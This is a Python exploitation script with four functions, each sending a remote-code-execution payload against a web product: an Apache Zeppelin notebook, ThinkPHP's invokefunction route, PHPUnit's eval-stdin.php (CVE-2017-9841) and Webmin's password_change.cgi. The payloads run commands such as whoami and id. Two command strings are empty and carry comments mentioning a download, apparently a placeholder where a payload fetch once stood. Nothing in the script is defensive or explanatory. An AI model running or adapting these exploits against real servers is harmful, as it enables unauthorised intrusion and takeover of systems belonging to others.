import requests
import re





def  zep_cve( target ): #zeppelin 


 h = {'Content-Type': 'application/json'}


 data = {

    "name": "n",


    "paragraphs": [
        {
            "title": "testeteste",
            "text": "%python\nimport os\nos.system(\"whoami)\")"
        }
 
   ]
}



 url =  target + '/api/notebook/'
 resp = requests.post(url ,  json=data , headers=h ,  verify=0)
 r = resp.json()
 job_id = (r.get('body'))
 url = url + 'job/' + job_id
 r = requests.post(url  , headers=h , verify=0)

 print(r.text)


    
  

#############################################





def think_cve( target )  :




   payload = '/index.php?s=/Index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id ; date ; whoami'
   


   target = f"{target}{payload}"   #download of atila



   print(target)
 

   re =    requests.get(target , verify=0 , timeout=10)
    

   print(re.text)

  





#########################################################################################3






def php_unit( target ) :

#CVE-2017-9841




    payload  =    '<?php  system (''); ?>'   #download of atila



    target  =  target  + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'

        

     
    r = requests.post(target , data=payload , verify=0, timeout=15)
  


    

  


 
def webmin_cve (target):



 cmd =   ''  #download of atila





      
 data = f"user=rootxx&pam=&expired=2&old=test|{cmd}&new1=test2&new2=test2"
       


 
 target =  target.replace('https://', '')

 


 h = {
        
        "Host": f"{target}" , 

        "Referer": f"https://{target}/session_login.cgi",

        "Content-Type": "application/x-www-form-urlencoded"

}





 
 target =  target + '/password_change.cgi'

 target =  'https://' +  target





 r = requests.post( target, headers=h  , data=data ,  verify=0 , timeout=10)

 print(r.text)
  


